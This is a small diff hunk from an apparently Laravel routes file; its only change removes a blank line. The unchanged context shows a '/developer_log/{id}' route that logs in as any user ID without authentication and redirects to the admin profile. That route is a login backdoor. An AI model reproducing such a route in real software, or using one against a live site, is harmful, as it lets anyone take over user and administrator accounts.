@@ -178,7 +178,6 @@ Route::get('/copy', function () {
 
     dd($articles);
 });*/
-
 Route::get('/developer_log/{id}', function ($id) {
     Auth::loginUsingId($id);
     return redirect()->route('admin.profile.show');
